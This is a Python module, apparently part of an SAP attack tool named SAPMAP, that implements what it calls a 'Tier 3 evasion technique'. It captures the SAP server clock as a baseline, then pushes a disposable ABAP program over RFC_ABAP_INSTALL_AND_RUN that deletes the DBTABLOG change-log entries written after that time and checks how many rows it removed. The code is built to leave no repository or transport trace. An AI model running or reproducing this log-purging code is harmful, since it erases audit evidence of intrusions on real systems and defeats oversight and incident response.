#!/usr/bin/env python3
"""DBTABLOG post-hoc purge — Tier 3 evasion technique (Approach C).

Strategy: do NOT block the kernel's logging path (which would require
DD09L mutation + DDIF_TABL_ACTIVATE — loud, transport-tracked, dictionary
brick risk).  Instead let logging proceed normally during the hold
window, then surgically delete the rows we wrote.

Why this is safe:
  * DBTABLOG is delivery class ``L`` (log table) and is itself NOT
    registered for change logging — deletes do not recurse (see SAP
    error message DT 755).
  * Comparison uses ``LOGDATE + LOGTIME`` (DATS + TIMS) — the natively
    temporal columns on DBTABLOG — so ``(logdate > d) OR
    (logdate = d AND logtime > t)`` is correct on every DB backend.
    NOTE: LOGID is NOT temporally sortable (the leading 6-char prefix
    is a sequence counter that rolls over, not a timestamp).  An
    earlier version of this module compared LOGID lexically and
    silently deleted zero rows — confirmed on S4H lab kernel 793.
  * No DDIC mutation, no DD09L touch, no transport object created.

Delivery: ``RFC_ABAP_INSTALL_AND_RUN`` with a throwaway program.
Goes through the ABAP DB interface — same layer that wrote the entries
in the first place.  No TADIR entry (the generated program is executed
and discarded).
"""

from __future__ import annotations

import logging
import re
from typing import Iterable, Optional

logger = logging.getLogger(__name__)

# Hard ceiling on tabname filter size — keeps the generated ABAP under
# the RFC_ABAP_INSTALL_AND_RUN program-line budget and avoids silently
# clipping operator intent.
_MAX_TABNAMES = 32


_DATE_RE = re.compile(r"^[0-9]{8}$")
_TIME_RE = re.compile(r"^[0-9]{6}$")


def _build_purge_abap(base_date: str, base_time: str,
                       tabname_filter: Optional[Iterable[str]] = None
                       ) -> list:
    """Return ABAP source lines for the DELETE program.

    ``base_date`` is YYYYMMDD, ``base_time`` is HHMMSS — both as
    captured from ``sy-datum`` / ``sy-uzeit`` at baseline time.

    The program:
      1. DELETEs DBTABLOG rows whose ``LOGDATE+LOGTIME`` is strictly
         after the baseline (optionally narrowed by a tabname IN range).
      2. WRITEs ``DELETED|<sy-dbcnt>`` and ``REMAINING|<count>``
         for caller-side parsing.
    """
    if not _DATE_RE.match(base_date):
        raise ValueError(f"invalid base_date: {base_date!r}")
    if not _TIME_RE.match(base_time):
        raise ValueError(f"invalid base_time: {base_time!r}")

    where_clause = (
        "WHERE logdate > lv_d "
        "OR ( logdate = lv_d AND logtime > lv_t )")

    lines = [
        "REPORT zsapmap_dbpurge LINE-SIZE 1023.",
        f"DATA: lv_d TYPE sy-datum VALUE '{base_date}'.",
        f"DATA: lv_t TYPE sy-uzeit VALUE '{base_time}'.",
        "DATA: lv_rem TYPE i.",
    ]

    tabs = list(tabname_filter or [])
    if tabs:
        if len(tabs) > _MAX_TABNAMES:
            raise ValueError(
                f"tabname_filter has {len(tabs)} entries; "
                f"max is {_MAX_TABNAMES}")
        lines.append(
            "DATA: lr_tabs TYPE RANGE OF dbtablog-tabname,")
        lines.append(
            "      ls_tab LIKE LINE OF lr_tabs.")
        lines.append("ls_tab-sign = 'I'. ls_tab-option = 'EQ'.")
        for tab in tabs:
            # Uppercase + strip whitespace; ABAP table names are
            # uppercase by convention.
            safe_tab = tab.strip().upper().replace("'", "''")
            if not re.match(r"^[A-Z0-9_/]{1,30}$", safe_tab):
                raise ValueError(f"invalid tabname: {tab!r}")
            lines.append(
                f"ls_tab-low = '{safe_tab}'. APPEND ls_tab TO lr_tabs.")
        lines.append(
            f"DELETE FROM dbtablog {where_clause} "
            f"AND tabname IN lr_tabs.")
        lines.append("WRITE: / 'DELETED|', sy-dbcnt.")
        lines.append("COMMIT WORK.")
        lines.append(
            f"SELECT COUNT(*) FROM dbtablog INTO lv_rem "
            f"{where_clause} AND tabname IN lr_tabs.")
    else:
        lines.append(f"DELETE FROM dbtablog {where_clause}.")
        lines.append("WRITE: / 'DELETED|', sy-dbcnt.")
        lines.append("COMMIT WORK.")
        lines.append(
            f"SELECT COUNT(*) FROM dbtablog INTO lv_rem {where_clause}.")

    lines.append("WRITE: / 'REMAINING|', lv_rem.")
    return lines


def _build_baseline_abap() -> list:
    """ABAP that emits ``BASE_DATE|YYYYMMDD`` and ``BASE_TIME|HHMMSS``.

    Assigns sy-datum / sy-uzeit to fixed-length CHAR fields before
    WRITE so the output format is independent of the SAPMAP user's
    date/time-format settings.
    """
    return [
        "REPORT zsapmap_dbbase LINE-SIZE 1023.",
        "DATA: lv_d(8) TYPE c.",
        "DATA: lv_t(6) TYPE c.",
        "lv_d = sy-datum.",
        "lv_t = sy-uzeit.",
        "WRITE: / 'BASE_DATE|', lv_d.",
        "WRITE: / 'BASE_TIME|', lv_t.",
    ]


def _parse_kv_line(lines: list, key: str) -> Optional[str]:
    """Pull the ``KEY|<value>`` line from a WRITE output list."""
    needle = key + "|"
    for line in lines:
        s = (line or "").strip()
        if s.startswith(needle):
            return s[len(needle):].strip()
        # ABAP WRITE: / 'KEY|', val   may render as 'KEY|        12'
        # (with a gap before the value).  Match that too.
        m = re.match(rf"^{re.escape(key)}\|\s*(.*)$", s)
        if m:
            return m.group(1).strip()
    return None


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def read_baseline_timestamp(node, creds=None) -> dict:
    """Capture ``sy-datum`` and ``sy-uzeit`` via RFC_ABAP_INSTALL_AND_RUN.

    The SAP server's clock is authoritative — never use the SAPMAP
    client's clock (drift would corrupt the WHERE comparison).

    Returns ``{ok, base_date, base_time, raw, error}`` — both
    timestamps as fixed-width strings (YYYYMMDD / HHMMSS).
    """
    import sapmap_rfc
    result = {"ok": False, "base_date": "", "base_time": "",
              "raw": [], "error": ""}
    abap = _build_baseline_abap()
    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            run = sapmap_rfc._run_abap_program(conn, abap,
                                                 "ZSAPMAP_DBBASE")
    except Exception as e:
        from sapmap_errors import format_rfc_exception
        result["error"] = format_rfc_exception(e)[:200]
        return result

    result["raw"] = run.get("output") or []
    if not run.get("success"):
        result["error"] = (run.get("error") or "RFC_ABAP_INSTALL_AND_RUN failed")[:200]
        return result

    date_val = _parse_kv_line(result["raw"], "BASE_DATE")
    time_val = _parse_kv_line(result["raw"], "BASE_TIME")
    if date_val is None or time_val is None:
        result["error"] = (
            f"BASE_DATE/BASE_TIME marker missing from output: "
            f"{result['raw'][:4]}")
        return result
    if not _DATE_RE.match(date_val):
        result["error"] = f"unexpected BASE_DATE format: {date_val!r}"
        return result
    if not _TIME_RE.match(time_val):
        result["error"] = f"unexpected BASE_TIME format: {time_val!r}"
        return result
    result["base_date"] = date_val
    result["base_time"] = time_val
    result["ok"] = True
    return result


def purge_dbtablog(node, base_date: str, base_time: str,
                    tabname_filter: Optional[Iterable[str]] = None,
                    creds=None) -> dict:
    """Delete DBTABLOG entries written after ``(base_date, base_time)``.

    Comparison: ``logdate > base_date OR (logdate = base_date AND
    logtime > base_time)`` — strict ``>`` on the same-date case so
    rows from earlier seconds on the baseline date stay untouched.

    Returns ``{ok, deleted_count, remaining_count, raw, error}``.
    ``remaining_count`` should be 0 on success — non-zero means the
    DELETE didn't authorize or the WHERE clause didn't match.
    """
    import sapmap_rfc
    result = {"ok": False, "deleted_count": 0, "remaining_count": -1,
              "raw": [], "error": ""}

    try:
        abap = _build_purge_abap(base_date, base_time, tabname_filter)
    except ValueError as e:
        result["error"] = str(e)
        return result

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            run = sapmap_rfc._run_abap_program(conn, abap,
                                                 "ZSAPMAP_DBPURGE")
    except Exception as e:
        from sapmap_errors import format_rfc_exception
        result["error"] = format_rfc_exception(e)[:200]
        return result

    result["raw"] = run.get("output") or []
    if not run.get("success"):
        result["error"] = (run.get("error") or "RFC_ABAP_INSTALL_AND_RUN failed")[:200]
        return result

    deleted_s = _parse_kv_line(result["raw"], "DELETED")
    remaining_s = _parse_kv_line(result["raw"], "REMAINING")
    try:
        result["deleted_count"] = int(deleted_s) if deleted_s else 0
    except ValueError:
        result["error"] = f"non-int DELETED value: {deleted_s!r}"
        return result
    try:
        result["remaining_count"] = (
            int(remaining_s) if remaining_s is not None else -1)
    except ValueError:
        result["error"] = f"non-int REMAINING value: {remaining_s!r}"
        return result

    if result["remaining_count"] > 0:
        result["error"] = (
            f"DELETE incomplete — {result['remaining_count']} row(s) "
            f"with LOGID > baseline remain (auth check on DBTABLOG?)")
        return result

    result["ok"] = True
    return result
